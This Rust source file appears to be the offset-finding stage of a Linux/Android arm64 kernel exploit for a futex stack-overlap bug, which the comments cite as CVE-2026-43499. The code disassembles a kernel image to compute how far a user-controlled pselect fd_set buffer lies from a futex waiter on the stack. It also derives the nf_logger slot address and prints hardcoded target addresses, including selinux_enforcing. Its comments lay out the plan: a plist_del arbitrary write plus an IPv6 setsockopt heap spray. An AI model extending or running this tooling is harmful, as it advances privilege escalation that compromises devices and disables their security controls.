//! Disassembly-driven derivation: pselect/futex waiter layout and the
//! nf_logger slide slot. Direct ports of the Python analysis.

use std::collections::{BTreeMap, BTreeSet};

use regex::Regex;

use crate::btf::Btf;
use crate::disasm::{
    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
    is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
};
use crate::error::{ExtractError, Result};
use crate::kallsyms::unique_or_err;

pub const PSELECT_ROUTE_NFDS: u64 = 320;
pub const OBJDUMP_CAP: usize = 0x2000;

pub type RelSymbols = BTreeMap<String, BTreeSet<u64>>;

/// Rebase kallsyms onto _text and return a sorted list of all offsets.
pub fn relative_symbols(
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
) -> (RelSymbols, Vec<u64>) {
    let mut relative: RelSymbols = BTreeMap::new();
    let mut all_offsets: BTreeSet<u64> = BTreeSet::new();
    for (name, values) in symbols {
        let offsets: BTreeSet<u64> = values
            .iter()
            .filter(|value| **value >= base)
            .map(|value| *value - base)
            .collect();
        if !offsets.is_empty() {
            relative.insert(name.clone(), offsets.clone());
            all_offsets.extend(offsets);
        }
    }
    let sorted: Vec<u64> = all_offsets.into_iter().collect();
    (relative, sorted)
}

pub fn unique_offset(symbols: &RelSymbols, name: &str) -> Result<u64> {
    unique_or_err(symbols, name)
}

pub fn unique_offset_optional(symbols: &RelSymbols, name: &str) -> Option<u64> {
    unique_offset(symbols, name).ok()
}

fn disassemble_symbol(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    name: &str,
    cap: usize,
) -> Result<Vec<String>> {
    let start = unique_offset(symbols, name)? as usize;
    let higher = sorted_offsets.iter().find(|off| **off as usize > start);
    let stop = (start + cap).min(higher.map_or(start + cap, |off| *off as usize));
    disassemble_range(kernel, start, stop)
}

pub struct PselectLayout {
    pub shift: u64,
    pub waiter_local: u64,
    pub pselect_word0: i64,
    pub futex_waiter: i64,
    pub pselect_buffer: u64,
    pub chain: String,
    pub futex_chain: String,
    pub frames: BTreeMap<String, u64>,
}

pub fn derive_pselect_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
    route_nfds: u64,
) -> Result<PselectLayout> {
    let mut names: Vec<(&str, &str)> = vec![
        ("pselect_wrapper", "__arm64_sys_pselect6"),
        ("pselect_core", "core_sys_select"),
        ("futex_wrapper", "__arm64_sys_futex"),
        ("futex_dispatch", "do_futex"),
        ("futex_wait", "futex_wait_requeue_pi"),
    ];
    if unique_offset_optional(symbols, "do_pselect").is_some() {
        names.push(("pselect_dispatch", "do_pselect"));
    }
    // Probe alternate STACK-based (not heap) user-copy primitives for 5.x.
    // The CVE-2026-43499 primitive needs a user-controlled buffer on the
    // KERNEL STACK that lands on the futex waiter.  Heap objects (epitem,
    // io_uring sqe/cqe) cannot overlap a stack waiter.  Only syscalls that
    // copy user data into a stack frame are candidates.  Report their frame
    // depth so we can see which one puts its buffer at the waiter depth.
    for alt in [
        "___sys_sendmsg", "__sys_sendmsg", "do_sendmsg", "sys_sendmsg",
        "___sys_recvmsg", "__sys_recvmsg", "do_recvmsg",
        "____sys_recvmsg", "__sys_recvfrom", "do_recvfrom",
        "do_writev", "do_readv", "___sys_writev", "___sys_readv",
        "do_sys_epoll_wait", "ep_poll", "do_sys_epoll_ctl",
    ] {
        if let Some(off) = unique_offset_optional(symbols, alt) {
            let higher = sorted_offsets.iter().find(|o| **o > off);
            let stop = (off as usize + 0x800).min(higher.map_or(off as usize + 0x800, |o| *o as usize));
            if let Ok(lines) = disassemble_range(kernel, off as usize, stop) {
                let frame = first_sp_frame(&lines, alt).unwrap_or(0);
                eprintln!("stackbuf {alt} frame={frame:#x}");
            }
        }
    }
    // The futex waiter depth on 5.15 is -(0xa0+0x140+0x1b0)+0x98 = -0x2f8.
    // For a stack-copy primitive to overlap it, the sum of the wrapper frames
    // above the user-copy buffer must be ~0x2f8.  Print the sendmsg chain
    // (__arm64_sys_sendmsg -> ___sys_sendmsg) partial sums and the iovec copy
    // sites (import_iovec / rw_copy_check_user) so we can see if a freed
    // waiter frame can be reclaimed there.
    for alt in ["__arm64_sys_sendmsg", "__arm64_sys_recvmsg", "__arm64_sys_sendto",
                "___sys_sendmsg", "sendmsg_copy_msghdr", "sendmsg_copy_msghdr_from_user",
                "___sys_sendmsg"] {
        if let Some(off) = unique_offset_optional(symbols, alt) {
            let higher = sorted_offsets.iter().find(|o| **o > off);
            let stop = (off as usize + 0x800).min(higher.map_or(off as usize + 0x800, |o| *o as usize));
            if let Ok(lines) = disassemble_range(kernel, off as usize, stop) {
                let frame = first_sp_frame(&lines, alt).unwrap_or(0);
                let calls: Vec<String> = lines.iter()
                    .filter(|l| l.trim_start().starts_with("bl "))
                    .take(4).map(|l| l.trim().to_string()).collect();
                eprintln!("chain {alt} frame={frame:#x} calls=[{}]", calls.join(", "));
            }
        }
    }

    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }

    let mut pselect_chain = vec!["pselect_wrapper"];
    let pselect_core_addr = unique_offset(symbols, "core_sys_select")?;
    if has_direct_call(&dis["pselect_wrapper"], pselect_core_addr) {
        // inline path
    } else if names.iter().any(|(k, _)| *k == "pselect_dispatch") {
        let dispatch_addr = unique_offset(symbols, "do_pselect")?;
        if !has_direct_call(&dis["pselect_wrapper"], dispatch_addr) {
            return Err(ExtractError::new(
                "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
            ));
        }
        if !has_direct_call(&dis["pselect_dispatch"], pselect_core_addr) {
            return Err(ExtractError::new(
                "do_pselect does not directly call core_sys_select",
            ));
        }
        pselect_chain.push("pselect_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
        ));
    }
    pselect_chain.push("pselect_core");

    let mut futex_chain = vec!["futex_wrapper"];
    let futex_wait_addr = unique_offset(symbols, "futex_wait_requeue_pi")?;
    if has_direct_call(&dis["futex_wrapper"], futex_wait_addr) {
        // direct path
    } else if has_direct_call(&dis["futex_wrapper"], unique_offset(symbols, "do_futex")?) {
        if !has_direct_call(&dis["futex_dispatch"], futex_wait_addr) {
            return Err(ExtractError::new(
                "do_futex does not directly call futex_wait_requeue_pi",
            ));
        }
        futex_chain.push("futex_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi",
        ));
    }
    futex_chain.push("futex_wait");

    for (caller, callee) in pselect_chain.iter().zip(pselect_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }
    for (caller, callee) in futex_chain.iter().zip(futex_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }

    let mut frames: BTreeMap<String, u64> = BTreeMap::new();
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
    }

    // 6.x kernels name these fields tree/pi_tree; 5.x kernels (pre-6.4) name
    // them tree_entry/pi_tree_entry.  Accept both so the waiter-local
    // derivation works across the two layout families.
    let pi_tree = btf
        .field("rt_mutex_waiter", "pi_tree")
        .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"));
    let wake_state = btf
        .field("rt_mutex_waiter", "wake_state");
    if pi_tree.is_none() || wake_state.is_none() {
        if let Some(item) = btf.named_struct("rt_mutex_waiter") {
            let members: Vec<String> = item
                .members
                .iter()
                .map(|m| format!("{}@{:#x}", m.name, m.bit_offset / 8))
                .collect();
            eprintln!(
                "error: BTF rt_mutex_waiter has no pi_tree/pi_tree_entry or wake_state; \
                 members=[{}]",
                members.join(" ")
            );
        }
        return Err(ExtractError::new(
            "BTF rt_mutex_waiter.pi_tree/pi_tree_entry or wake_state missing",
        ));
    }
    let pi_tree = pi_tree.unwrap() as u64;
    let wake_state = wake_state.unwrap() as u64;

    // Diagnostic: dump the real rt_mutex_waiter layout so we can confirm the
    // PI-chain primitive type (rb_node pi_tree vs plist_node pi_tree_entry).
    if let Some(item) = btf.named_struct("rt_mutex_waiter") {
        let members: Vec<String> = item
            .members
            .iter()
            .map(|m| format!("{}@{:#x}", m.name, m.bit_offset / 8))
            .collect();
        let has_pi_tree = btf.field("rt_mutex_waiter", "pi_tree").is_some();
        let has_pi_tree_entry = btf.field("rt_mutex_waiter", "pi_tree_entry").is_some();
        eprintln!(
            "diag: rt_mutex_waiter pi_tree={has_pi_tree} pi_tree_entry={has_pi_tree_entry} \
             pi_tree_off={pi_tree:#x} wake_state_off={wake_state:#x} members=[{}]",
            members.join(" ")
        );
    }

    // Diagnostic: find which kernel symbol contains fake_lock=0xD65BD8 and
    // scratch=0xD92E38 (the reference's fake-waiter lock/value bases).  This
    // tells us the blob lock offset (+0x40/+0x80) and confirms the lock is a
    // static kernel object, not a dynamic pi_state.
    for (label, addr) in [
        ("fake_lock", 0xD65BD8u64),
        ("scratch", 0xD92E38u64),
        ("fake_lock+0x40", 0xD65C18u64),
        ("fake_lock+0x80", 0xD65C58u64),
        /* reference target profile offsets (low 32 from .data.rel.ro) */
        ("P1_task", 0x2AC33580u64),
        ("P1_38", 0x2ABED628u64),
        ("P1_lock", 0x2AD44BD8u64),
        ("P1_rbleft", 0x2AD99CF0u64),
        ("P1_scratch", 0x2AD71E38u64),
        ("P2_task", 0x2AC53440u64),
        ("P2_lock", 0x2AD65BD8u64),
        ("P2_rbleft", 0x2ADDAB88u64),
        ("P2_scratch", 0x2AD92E38u64),
        ("selinux_enforcing", 0x2DBAD88u64),
    ] {
        let mut best: Option<(u64, String)> = None;
        for (name, offs) in symbols {
            for &o in offs {
                if o <= addr && best.as_ref().map_or(true, |(bo, _)| o > *bo) {
                    best = Some((o, name.clone()));
                }
            }
        }
        if let Some((o, name)) = best {
            eprintln!("diag: {label} 0x{addr:x} in symbol {name} @ 0x{o:x} (+0x{:x})",
                      addr - o);
        } else {
            eprintln!("diag: {label} 0x{addr:x} NO containing symbol");
        }
    }

    // Diagnostic: dump the IPv6 multicast heap objects that the reference
    // 5.15 write primitive sprays as the fake plist node carrier.
    // First, find the kernel linux_banner so we can pin the exact release.
    if let Some(idx) = kernel.windows(16).position(|w| w == b"Linux version 5") {
        let start = idx;
        let end = kernel[start..]
            .iter()
            .position(|b| *b == 0)
            .map(|d| start + d)
            .unwrap_or(kernel.len());
        eprintln!(
            "diag: linux_banner offset=0x{start:x} = {}",
            String::from_utf8_lossy(&kernel[start..end])
        );
    } else {
        eprintln!("diag: linux_banner 'Linux version 5' NOT FOUND");
    }
    for struct_name in [
        "ipv6_mc_socklist",
        "ipv6_mc_list",
        "ip6_mc_list",
        "ip6_sf_list",
        "ip6_sf_socklist",
        "plist_node",
        "list_head",
        "selinux_state",
    ] {
        if let Some(item) = btf.named_struct(struct_name) {
            let members: Vec<String> = item
                .members
                .iter()
                .map(|m| format!("{}@{:#x}", m.name, m.bit_offset / 8))
                .collect();
            eprintln!("diag: {struct_name} sizeof={:#x} members=[{}]", item.size_or_type, members.join(" "));
        } else {
            eprintln!("diag: {struct_name} NOT FOUND in BTF");
        }
    }

    // Diagnostic: disassemble the plist / rt_mutex PI-chain functions to lock
    // down the 5.15 write direction (which list_head write is used).
    for fname in [
        "__plist_del", "plist_del", "__plist_add", "plist_add",
        "plist_rotate", "__plist_rotate", "plist_set_prio",
        "rt_mutex_adjust_prio_chain", "__rt_mutex_adjust_prio_chain",
        "rt_mutex_enqueue", "rt_mutex_enqueue_pi",
        "rt_mutex_waiter_remove", "remove_waiter",
        // Internal helpers remove_waiter() calls; the 5.15 write primitive
        // (plist_del / __list_del) is what actually performs [prev]=next.
        "rt_mutex_waiter_remove_helper",
    ] {
        let Some(off) = unique_offset_optional(symbols, fname) else {
            eprintln!("diag: {fname} NOT FOUND");
            continue;
        };
        let higher = sorted_offsets.iter().find(|o| **o > off).copied();
        let cap = 0x600;
        let stop = (off as usize + cap).min(higher.map_or(off as usize + cap, |o| o as usize));
        if let Ok(lines) = disassemble_range(kernel, off as usize, stop) {
            eprintln!("diag: ---- {fname} @ {off:#x} ----");
            for line in lines {
                eprintln!("  {line}");
            }
        }
    }

    // Diagnostic: brute disassemble the leaf helpers remove_waiter() calls
    // (0xa5bffc / 0xa5c25c / 0xa5c08c / 0xa5ba4 / 0x9e5c78) to confirm which
    // list_head write is the real arbitrary-write primitive on 5.15.
    for (hname, off) in [
        ("remove_waiter_bl_a5bffc", 0xa5bffcusize),
        ("remove_waiter_bl_a5c25c", 0xa5c25cusize),
        ("remove_waiter_bl_a5c08c", 0xa5c08cusize),
        ("remove_waiter_bl_a5ba4", 0xa5ba4usize),
        ("remove_waiter_bl_9e5c78", 0x9e5c78usize),
    ] {
        let cap = 0x300;
        let stop = off + cap;
        if off + cap <= kernel.len() {
            if let Ok(lines) = disassemble_range(kernel, off, stop) {
                eprintln!("diag: ---- {hname} @ {off:#x} ----");
                for line in lines {
                    eprintln!("  {line}");
                }
            }
        }
    }

    // Diagnostic: disassemble do_ipv6_setsockopt to find the optname-46
    // handler that the reference 5.15 spray uses to reclaim the fake node.
    for (fname, off) in [
        ("do_ipv6_setsockopt", 0x153c86cusize),
        ("ipv6_setsockopt", 0x153c74cusize),
        ("ipv6_sock_mc_join", 0x1553480usize),
        ("ipv6_sock_mc_join_ssm", 0x1556c2cusize),
        ("ip6_mc_msfilter", 0x1557d8cusize),
        ("opt46_processing", 0x153d5a0usize),
        ("opt46_copy_user", 0x153d994usize),
    ] {
        let cap = 0x800;
        let stop = off + cap;
        if off + cap <= kernel.len() {
            if let Ok(lines) = disassemble_range(kernel, off, stop) {
                eprintln!("diag: ---- {fname} @ {off:#x} (from on-device kallsyms) ----");
                for line in lines {
                    eprintln!("  {line}");
                }
            }
        }
    }

    // Dump the optname jump table so we can confirm which optname maps to the
    // 264-byte handler.  Table at 0x1f51d2c, base = 0x153c98c.
    let table = 0x1f51d2cusize;
    if table + 256 <= kernel.len() {
        eprintln!("diag: optname jump table @ {table:#x}:");
        for idx in 0..64usize {
            let off = table + idx * 4;
            let val = u32::from_le_bytes(
                kernel[off..off + 4].try_into().unwrap());
            eprintln!("  optname={} (idx {idx:#x}) disp={val} -> target={:#x}",
                      idx + 1, 0x153c98cusize.wrapping_add(val as usize));
        }
    }

    let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
    for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
        if pi_tree != 0 {
            let re = Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b"))
                .unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        } else {
            let re = Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]"))
                .unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        }
    }
    // Several registers may materialize the same sp local; dedupe by offset.
    let mut seen = BTreeSet::new();
    waiter_candidates.retain(|(_, imm)| seen.insert(*imm));
    // wake_state is a 4-byte int; the real on-stack rt_mutex_waiter has a
    // 32-bit store (str w..) at [sp, #waiter+wake_state].  A 64/128-bit
    // stp/ldp there means the local is some other struct.  Prefer the
    // candidate whose wake_state slot is written by a narrow store.
    if waiter_candidates.len() > 1 && wake_state != 0 {
        let narrow = Regex::new(r"(?i)\bstr\s+w\d+,\s*\[sp,").unwrap();
        let wide = Regex::new(r"(?i)\b(stp|ldp)\s+x\d+").unwrap();
        let mut scored: Vec<(&(String, u64), bool)> = waiter_candidates
            .iter()
            .map(|cand| {
                let ws = cand.1 + wake_state;
                let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{ws:x}\]")).unwrap();
                let narrow_hit = dis["futex_wait"]
                    .iter()
                    .any(|line| re.is_match(line) && narrow.is_match(line));
                let wide_hit = dis["futex_wait"]
                    .iter()
                    .any(|line| re.is_match(line) && wide.is_match(line));
                (cand, narrow_hit || !wide_hit)
            })
            .collect();
        let winners: Vec<&(String, u64)> = scored
            .iter()
            .filter(|(_, ok)| *ok)
            .map(|(cand, _)| *cand)
            .collect();
        if winners.len() == 1 {
            waiter_candidates = winners.into_iter().cloned().collect();
        }
    }
    if waiter_candidates.len() != 1 {
        return Err(ExtractError::new(format!(
            "futex waiter stack local not unique: {waiter_candidates:?}"
        )));
    }
    let (waiter_reg, waiter_local) = &waiter_candidates[0];
    let anchor = Regex::new(&format!(
        r"(?i)\badd\s+{waiter_reg},\s*sp,\s*#0x{waiter_local:x}\b"
    ))
    .unwrap();
    validate_frame_live_at(&dis["futex_wait"], &anchor, "futex_wait")?;

    let mut required_fields = vec![*waiter_local];
    if wake_state != 0 {
        required_fields.push(waiter_local + wake_state);
    }
    for required in required_fields {
        let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{required:x}\]")).unwrap();
        if !dis["futex_wait"].iter().any(|line| re.is_match(line)) {
            return Err(ExtractError::new(format!(
                "futex waiter candidate 0x{waiter_local:x} not cross-validated \
                 by a real field store at 0x{required:x}"
            )));
        }
    }

    let add_sp = add_sp_immediates(&dis["pselect_core"]);
    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
    for (reg, imm) in &add_sp {
        let peers: Vec<&str> = add_sp
            .iter()
            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
            .map(|(peer, _)| peer.as_str())
            .collect();
        let any_cmp = peers.iter().any(|peer| {
            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
            dis["pselect_core"]
                .iter()
                .any(|line| re.is_match(line) || re2.is_match(line))
        });
        if any_cmp {
            buffer_candidates.insert(*imm);
        }
    }
    if buffer_candidates.len() != 1 {
        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
        return Err(ExtractError::new(format!(
            "core_sys_select fd_set buffer candidates not unique: {hex:?}"
        )));
    }
    let pselect_buffer = *buffer_candidates.iter().next().unwrap();
    let buffer_regs: BTreeSet<String> = add_sp
        .iter()
        .filter(|(_, imm)| *imm == pselect_buffer)
        .map(|(reg, _)| reg.clone())
        .collect();
    if buffer_regs.is_empty() {
        return Err(ExtractError::new(
            "core_sys_select stack buffer has no output register",
        ));
    }
    let buffer_regs: Vec<String> = buffer_regs.into_iter().collect();
    for buffer_reg in &buffer_regs {
        let anchor = Regex::new(&format!(
            r"(?i)\badd\s+{buffer_reg},\s*sp,\s*#0x{pselect_buffer:x}\b"
        ))
        .unwrap();
        validate_frame_live_at(
            &dis["pselect_core"],
            &anchor,
            &format!("core_sys_select/{buffer_reg}"),
        )?;
    }

    let fds_bytes = ((route_nfds + 63) / 64) * 8;
    let thresholds = cmp_immediates(&dis["pselect_core"]);
    if !thresholds
        .iter()
        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
    {
        return Err(ExtractError::new(format!(
            "core_sys_select threshold does not prove route_nfds={route_nfds} \
             uses the stack fd_set path"
        )));
    }

    let frame_sum: u64 = pselect_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
    let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
    let futex_sum: u64 = futex_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
    let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
    let delta = futex_waiter - pselect_word0;
    if delta < 0 || delta % 8 != 0 {
        return Err(ExtractError::new(format!(
            "pselect/futex overlap is not a non-negative qword: {delta}"
        )));
    }
    let shift = (delta / 8) as u64;
    if shift > 16 {
        return Err(ExtractError::infeasible(format!(
            "PSELECT_WAITER_WORD_SHIFT too large: {shift}"
        )));
    }
    if shift > 3 {
        return Err(ExtractError::infeasible(format!(
            "futex waiter starts {shift} qwords above the fd_set buffer; \
             task/lock would land outside the user-controlled words 0..14 \
             (max feasible shift is 3)"
        )));
    }
    if shift == 3 {
        eprintln!(
            "warning: waiter fits at the last usable word (shift=3); \
             wake_state falls outside the copied fd_set and relies on the \
             kernel zero-initialising it"
        );
    }
    let chain = pselect_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    let futex_chain_str = futex_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    Ok(PselectLayout {
        shift,
        waiter_local: *waiter_local,
        pselect_word0,
        futex_waiter,
        pselect_buffer,
        chain,
        futex_chain: futex_chain_str,
        frames,
    })
}

fn u32_at(data: &[u8], off: u64) -> Result<u32> {
    let off = off as usize;
    if off + 4 > data.len() {
        return Err(ExtractError::new(format!(
            "u32 read out of range: 0x{off:x}"
        )));
    }
    Ok(u32::from_le_bytes(data[off..off + 4].try_into().unwrap()))
}

pub struct NfLoggerInfo {
    pub loggers: u64,
    pub nfulnl_logger: u64,
    pub loggers_0_1: u64,
    pub nf_log_type_ulog: i64,
}

/// Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling nf_log_register /
/// nfnetlink_log_init and closing the slot index against BTF.
pub fn derive_nf_logger_registration(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
) -> Result<NfLoggerInfo> {
    let register_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nf_log_register", 0x800)?;
    let init_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nfnetlink_log_init", 0x800)?;
    let logger = unique_offset(symbols, "nfulnl_logger")?;
    let loggers = unique_offset(symbols, "loggers")?;
    let type_off = btf
        .field("nf_logger", "type")
        .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
    if btf.direct_field_size("nf_logger", "type") != Some(4) {
        return Err(ExtractError::new(
            "BTF nf_logger.type is not a 4-byte enum",
        ));
    }
    let logger_type = u32_at(kernel, logger + type_off as u64)?;
    let ulog_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
    let max_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
    let nfproto_unspec = btf
        .unique_enum_member_value("NFPROTO_UNSPEC")
        .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
    if logger_type as i64 != ulog_value || !(0 <= ulog_value && ulog_value < max_value) {
        return Err(ExtractError::new(format!(
            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: \
             data={logger_type}, ulog={ulog_value}, max={max_value}"
        )));
    }

    let logger_aliases: BTreeSet<String> = register_text
        .iter()
        .filter_map(|line| is_mov_x1(line))
        .collect();
    if logger_aliases.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register logger alias not unique: {logger_aliases:?}"
        )));
    }
    let logger_reg = logger_aliases.iter().next().unwrap().clone();
    let type_load_re = Regex::new(&format!(
        r"(?i)\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]"
    ))
    .unwrap();
    let mut type_loads: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in type_load_re.captures_iter(line) {
            type_loads.insert(caps[1].to_string());
        }
    }
    if type_loads.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register type load not unique: {type_loads:?}"
        )));
    }
    let type_reg = type_loads.iter().next().unwrap().clone();
    let adrp_re = Regex::new(r"(?i)\badrp\s+(x\d+),").unwrap();
    let mut base_regs: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in adrp_re.captures_iter(line) {
            let reg = caps[1].to_ascii_lowercase();
            if materialized_address(&register_text, &reg, loggers) {
                base_regs.insert(reg);
            }
        }
    }
    let mut indexed: Vec<(String, String)> = Vec::new();
    for base_reg in &base_regs {
        let lsl4_re = Regex::new(&format!(
            r"(?i)\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4"
        ))
        .unwrap();
        for line in &register_text {
            for caps in lsl4_re.captures_iter(line) {
                let destination = caps[1].to_ascii_lowercase();
                let pf_reg = caps[2].to_ascii_lowercase();
                let lsl3_re = Regex::new(&format!(
                    r"(?i)\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3"
                ))
                .unwrap();
                if register_text.iter().any(|l| lsl3_re.is_match(l)) {
                    indexed.push((destination, pf_reg));
                }
            }
        }
    }
    let mut deduped: Vec<(String, String)> = Vec::new();
    for entry in indexed {
        if !deduped.contains(&entry) {
            deduped.push(entry);
        }
    }
    if deduped.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register loggers[pf][type] dataflow not unique: {deduped:?}"
        )));
    }
    let (slot_reg, _) = &deduped[0];
    let stlr_re = Regex::new(&format!(
        r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]"
    ))
    .unwrap();
    if !register_text.iter().any(|line| stlr_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register does not store the logger to the slot",
        ));
    }
    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b"))
        .unwrap();
    if !register_text.iter().any(|line| bound_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
        ));
    }

    let target = unique_offset(symbols, "nf_log_register")?;
    let call_re = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
    let calls: Vec<usize> = init_text
        .iter()
        .enumerate()
        .filter(|(_, line)| call_re.is_match(line))
        .map(|(index, _)| index)
        .collect();
    if calls.len() != 1 {
        return Err(ExtractError::new(format!(
            "nfnetlink_log_init -> nf_log_register calls: {}",
            calls.len()
        )));
    }
    let start = calls[0].saturating_sub(6);
    let call_window: Vec<String> = init_text[start..calls[0]].to_vec();
    if nfproto_unspec != 0 || !call_window.iter().any(|line| is_mov_w0_wzr(line)) {
        return Err(ExtractError::new(
            "nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)",
        ));
    }
    if !materialized_address(&init_text, "x1", logger) {
        return Err(ExtractError::new(
            "nfnetlink_log_init x1 does not materialize nfulnl_logger",
        ));
    }
    let slot = loggers + ulog_value as u64 * 8;
    Ok(NfLoggerInfo {
        loggers,
        nfulnl_logger: logger,
        loggers_0_1: slot,
        nf_log_type_ulog: ulog_value,
    })
}
